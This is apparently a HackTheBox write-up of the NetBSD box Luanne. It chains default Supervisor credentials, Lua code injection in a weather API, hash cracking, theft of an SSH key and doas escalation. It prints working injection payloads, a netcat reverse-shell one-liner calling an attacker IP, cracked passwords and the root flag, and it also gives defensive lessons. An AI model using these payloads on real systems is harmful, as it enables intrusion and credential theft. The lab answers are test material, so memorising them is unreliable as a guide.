---
title: "Luanne"
date: 2020-11-21
type: docs
tags:
  - htb
  - netbsd
  - medium
  - supervisor
  - default-credentials
  - lua-injection
  - rce
  - verb-tampering
  - john
  - ssh-key
  - netpgp
  - doas
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** NetBSD 9.0, **Difficulty:** Medium, **Released:** 2020-11-21, **IP:** `10.10.10.218` , `luanne.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. nginx `:80` (Basic auth) proxies a **Lua** web API. `:9001` is a **Supervisor / Medusa** panel with default creds **`user : 123`**.
2. The Supervisor config points at the Lua weather API. `GET /weather/forecast?city=` is code injectable: `city=') os.execute('id') --` runs commands as **`_httpd`**.
3. Reverse shell. `/var/www/.htpasswd` , `webapi_user:$1$...` , crack with john (`iamthebest`).
4. Use the RCE (or the shell) to read `r.michaels`' SSH private key from `http://127.0.0.1:3001/` (or the file path). SSH as **`r.michaels`**.
5. `~/backups/devel_backup-*.tar.gz.enc` decrypts with **`netpgp --decrypt`** (r.michaels' key is in the keyring). Inside is a newer `.htpasswd` (`webapi_user:$1$6xc7I/LW$...`), crack it (`littlebear`).
6. `doas -u root <cmd>` accepts that password. **Root** (`doas` is NetBSD's `sudo`).

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| Supervisor panel | `user : 123` |
| `webapi_user` (live `.htpasswd`) | `iamthebest` |
| `webapi_user` (backup `.htpasswd`), also the `doas` password | `littlebear` |
| `user.txt` | `/home/r.michaels/user.txt` |
| `root.txt` | `/root/root.txt` , `7a9b5c206e8e8ba09bb99bd113675f66` |

</div>

---

## Overview

Luanne caught my attention the moment nmap finished, mostly because NetBSD targets are rare on HackTheBox and I wanted the chance to work through a box built on a different flavor of Unix than the usual Debian or Ubuntu install. My guiding principle going in was simple: whenever a low-privileged service hands you its own configuration file, read every line of it, because it will usually tell you exactly how the rest of the application is wired together. That held true here. The Supervisor process manager listening on port 9001 was still running with its default credentials, and once I was inside, its configuration pointed me straight at an internal Lua-based weather API and explained how nginx was routing requests into it.

From there, the foothold came down to classic code injection, just in a language I don't audit every day. The weather endpoint takes a `city` parameter and drops it, unsanitized, into a Lua string that eventually gets evaluated, functionally the same mistake as passing user input into `eval()` in Python or into an ERB template in Ruby. Once I confirmed that closing out the intended string with `') os.execute('...') --` triggered command execution, I had remote code execution as the `_httpd` user. Escalating from there followed a chain I found genuinely satisfying to piece together: cracking an md5crypt hash pulled from `.htpasswd` with john, reading `r.michaels`' SSH private key off an internal-only HTTP service through my existing RCE, decrypting a PGP-protected backup archive with `netpgp` (NetBSD's alternative to GnuPG), and finally reusing a second cracked password against `doas`, which is NetBSD and OpenBSD's answer to `sudo`.

This box pairs naturally with a few others I've written up. The default-credential theme echoes [Monitored](/writeups/hackthebox/linux/medium/monitored/), where another admin panel was left wide open. The "the config file will tell you where everything lives" pattern is the same one I leaned on for [Heal](/writeups/hackthebox/linux/medium/heal/) and for the Nagios instance inside Monitored. On the injection side, this sits alongside [Perfection](/writeups/hackthebox/linux/easy/perfection/), where the vulnerable template engine was ERB, and [Bolt](/writeups/hackthebox/linux/medium/bolt/), where it was Jinja2, both proof that server-side code injection shows up across every stack once you know the shape of it. And the PGP-encrypted loot here reminded me of what I found on [Environment](/writeups/hackthebox/linux/medium/environment/) and again on [Bolt](/writeups/hackthebox/linux/medium/bolt/).

---

## Full Walkthrough

### Recon

I started, as always, with a full nmap sweep, then pointed a browser at `luanne.htb` on port 80. It immediately threw up a Basic authentication prompt. Rather than guess at credentials, I hit cancel to see what the server would show me for an unauthenticated request, and the resulting 401 page happened to mention an internal server running on port 3000, a detail I filed away for later.

```console
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418; protocol 2.0)
80/tcp   open  http    nginx 1.19.0
| http-method-tamper:
|   VULNERABLE: Authentication bypass by HTTP verb tampering
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
```

(The full nmap and nikto output is trimmed here for brevity.)

<div class="callout callout-note">

**Two ways past the Basic auth**

nmap's script scan flagged something I always take seriously: **HTTP verb tampering**. The nginx configuration was restricting access with `limit_except`, which sounds thorough until you remember that `limit_except` only restricts the methods it names, everything else, including a `HEAD` request or an oddball verb like `PUT`, sails through without ever hitting the Basic auth check. That's a legitimate way into the protected Lua endpoints, and I noted it as a viable alternate path. In practice, though, I found a more direct route through the Supervisor panel on port 9001, so that's the path I followed and the one documented below.

</div>

### Supervisor default creds

```
http://luanne.htb:9001/
```

Browsing to port 9001 landed me on a login page, and the response headers gave away that it was running Medusa/Supervisor. Rather than brute-force anything, I went straight to the documented default credentials for Supervisor's web interface, **`user : 123`**, and they worked without modification. Once inside, the panel's `/logtail` links gave me a clear picture of what this box was actually running underneath: a Lua-based weather API exposed at `/weather/forecast` and `/weather/forecastlist`.

### Lua code injection

I wanted to see how the weather API handled malformed input before trying anything more aggressive, so my first test was to feed the `city` parameter a value designed to break out of whatever string or expression it was being embedded in:

```bash
curl -G --data-urlencode "city=') os.execute('id') --" 'http://10.10.10.218/weather/forecast' -s
```

```json
{"code": 500, "error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)"}
```

<div class="callout callout-note">

**Why this executes**

Digging into why this worked: `weather.lua` takes the raw `city` value and builds a Lua expression around it, one that ultimately gets passed through something like `loadstring`/`load`, or a `string.format` call that reaches into the `os` library. My payload, `') os.execute('id') --`, closes out whatever quote or function call the developer intended, injects my own `os.execute` call, and comments out whatever Lua code would have followed it. The reason I saw the command output reflected back in the JSON error is that my injected code executes before the application ever reaches its "unknown city" error branch, so the `id` output gets swept up into the error message as a side effect. Conceptually this is no different from a Python `eval()` on user input, an ERB template rendering unescaped data in Ruby, or PHP calling a variable function built from a request parameter: any language that lets you construct and execute code at runtime is dangerous the moment untrusted input touches that code path.

</div>

Confirming that `id` executed successfully told me I had genuine remote command execution, not just an error message echoing my input, so the obvious next move was to upgrade that into an interactive shell. I swapped the `id` call out for a classic named-pipe reverse shell one-liner and pointed it at a listener on my attacking box:

```bash
curl -G --data-urlencode "city=') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 9001 >/tmp/f') --" 'http://luanne.htb/weather/forecast' -s
```

The listener caught the connection and dropped me into a shell running as `_httpd`, the low-privileged user nginx and the Lua backend run under.

### _httpd to r.michaels

With a shell in hand, my next move was hunting for anything that might let me pivot to a real user account. Web server configuration directories are always worth checking first, since they often hold credential files left behind for application authentication, and sure enough:

```console
$ cat /var/www/.htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```

An md5crypt hash starting with `$1$` is fast enough to crack offline, so I threw it at john with rockyou.txt rather than trying to reverse it by hand:

```console
$ john --wordlist=rockyou.txt hash
iamthebest       (webapi_user)      # md5crypt ($1$)
```

Remembering the port 3000 reference from that earlier 401 page, I went back and took a closer look. It turned out to be a second `bozohttpd` instance, NetBSD's built-in web server, and this one had the `~user` feature enabled, which serves a user's home directory contents over HTTP. That is a dangerous default to leave switched on, because it meant `r.michaels`' home directory, SSH keys included, was reachable over HTTP from localhost. I didn't have direct access to that port from outside, but my existing Lua RCE gave me a way to reach it internally, so I used `os.execute` again, this time to curl the key out and print it back through the same injection point:

```bash
curl -G --data-urlencode "city=') os.execute('curl -s --path-as-is http://127.0.0.1:3001/~r.michaels/id_rsa') --" 'http://luanne.htb/weather/forecast' -s
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
... (trimmed) ...
-----END OPENSSH PRIVATE KEY-----
```

With the private key saved locally and its permissions locked down, logging in as `r.michaels` was just a matter of pointing ssh at it:

```bash
ssh -i id_rsa r.michaels@luanne.htb
```

### Privilege Escalation, netpgp backup then doas

Once I had a proper shell as `r.michaels`, I started the usual privilege escalation sweep, checking home directory contents, scheduled jobs, and anything with unusual permissions. A `backups` directory stood out immediately:

```console
luanne$ ls ~/backups
devel_backup-2020-09-16.tar.gz.enc
```

<div class="callout callout-note">

**`netpgp` on NetBSD**

This was actually new territory for me: NetBSD ships its own PGP implementation called **`netpgp`** rather than bundling GnuPG. Functionally it behaves the same way `gpg --decrypt` would, pulling from a keyring under `~/.gnupg` or `~/.netpgp`. The detail that made this trivial was that r.michaels' private key was already sitting in that keyring, so there was no passphrase to guess or crack, `netpgp` could decrypt the archive immediately using the key already available to the account I was logged in as. Once decrypted, the archive turned out to be nothing more exotic than a standard `.tar.gz`.

</div>

I decrypted the archive to `/tmp`, extracted it, and went looking for anything credential-shaped inside, which turned up another `.htpasswd` file:

```console
luanne$ netpgp --decrypt --output=/tmp/devel.tar.gz ~/backups/devel_backup-2020-09-16.tar.gz.enc
luanne$ cd /tmp && tar xzf devel.tar.gz
luanne$ cat devel-2020-09-16/www/.htpasswd
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
```

Same story as before, another md5crypt hash, so back to john with the same wordlist:

```console
$ john --wordlist=rockyou.txt hash2
littlebear       (webapi_user)
```

Cracking that hash gave me a second password, and on a hunch, since reused credentials are extremely common even on otherwise well-run boxes, I tried it against `r.michaels`' `doas` privileges rather than assuming it was only good for the web API:

```console
luanne$ doas -u root cat /root/root.txt
Password: littlebear
7a9b5c206e8e8ba09bb99bd113675f66
```

<div class="callout callout-note">

**`doas` is NetBSD/OpenBSD's `sudo`**

I hadn't worked with `doas` directly before this box, so I spent a minute confirming how it actually behaves. `/etc/doas.conf` here had a line reading `permit r.michaels as root`, which means `doas` prompts for r.michaels' own password (not root's) before elevating. Once I had that password from the cracked hash, running `doas -u root sh` handed me a full interactive root shell rather than just one command's worth of privilege. For anyone coming from Linux, `doas` on NetBSD and OpenBSD fills exactly the role `sudo` does, just with a smaller, more auditable codebase, which is part of why the BSD family favors it.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/r.michaels/user.txt` |
| `root.txt` | `/root/root.txt` , `7a9b5c206e8e8ba09bb99bd113675f66` |

---

## Lessons and Takeaways

- **Default credentials on management panels are still one of the fastest ways I get an initial foothold.** I didn't have to guess or brute-force anything on the Supervisor panel, a quick search for the documented default credentials got me `user : 123`, and from there its own configuration handed me a full map of the application it was managing. Any interface capable of controlling running processes needs its credentials rotated before it ever touches a network, internal or not.
- **Never build executable code out of user input, in any language.** I think of Lua's `loadstring`/`load` the same way I think of Python's `eval()`: incredibly convenient for a developer trying to build something dynamic, and incredibly dangerous the moment a request parameter reaches it unsanitized. The fix isn't clever escaping, it's structural: never concatenate user input into code that gets evaluated. Parameterize inputs, use a proper templating layer with autoescaping, or validate against a strict allowlist of expected values, since a city name has a very narrow legitimate character set to begin with.
- **`limit_except` in nginx is not the access control people assume it is.** I'd seen this misconfiguration before but it's worth restating: `limit_except GET POST { deny all; }` only restricts the methods it names, so `HEAD` requests, and any verb the config author didn't think to list, pass straight through untouched. If the goal is to gate a location behind authentication, the safer pattern is applying `auth_basic` unconditionally to the location, combined with an explicit method check like `if ($request_method !~ ^(GET|POST)$) { return 405; }`, rather than relying on `limit_except` alone.
- **Serving home directories over HTTP is asking for key material to leak.** `bozohttpd`'s `~user` feature is a relic of an earlier, more trusting internet, and it handed me r.michaels' SSH private key with zero effort once I found the port it was listening on. If a legacy feature like this has to stay enabled for compatibility reasons, at minimum keep it bound to loopback and never let SSH keys, credentials, or backups sit inside a directory the web server can reach.
- **Fast password hashes make cracking a formality, not a challenge.** Both `.htpasswd` files I found used md5crypt, which john tore through against rockyou.txt in seconds. If credentials must live in an `.htpasswd` file at all, use bcrypt at minimum, and better yet, generate long random values instead of memorable words that show up in every wordlist on the internet.
- **Don't assume every box speaks the same dialect of Unix.** This was my first NetBSD target, and walking in expecting Linux tooling would have cost me time: `doas` instead of `sudo`, `pkg_add` instead of `apt`, `netpgp` instead of GnuPG, and `/etc/rc.conf` instead of systemd units. Knowing the BSD family's conventions, even just enough to recognize when something is a NetBSD-flavored equivalent of a tool I already know, saved me from stalling out at the privilege escalation stage.

---

## Related Writeups

- **Default credentials on a panel:** [Monitored](/writeups/hackthebox/linux/medium/monitored/)
- **Code injection in a scripting language (Lua / ERB / Jinja2):** [Perfection](/writeups/hackthebox/linux/easy/perfection/), [Bolt](/writeups/hackthebox/linux/medium/bolt/)
- **HTTP verb tampering auth bypass:** [Luanne](/writeups/hackthebox/bsd/medium/luanne/) is the reference
- **PGP / GPG encrypted loot:** [Environment](/writeups/hackthebox/linux/medium/environment/), [Bolt](/writeups/hackthebox/linux/medium/bolt/)

## References

- Supervisor default credentials <http://supervisord.org/configuration.html#inet-http-server-section-settings>
- OWASP verb tampering <https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods>
- netpgp(1) NetBSD <https://man.netbsd.org/netpgp.1>
- doas(1) <https://man.openbsd.org/doas>
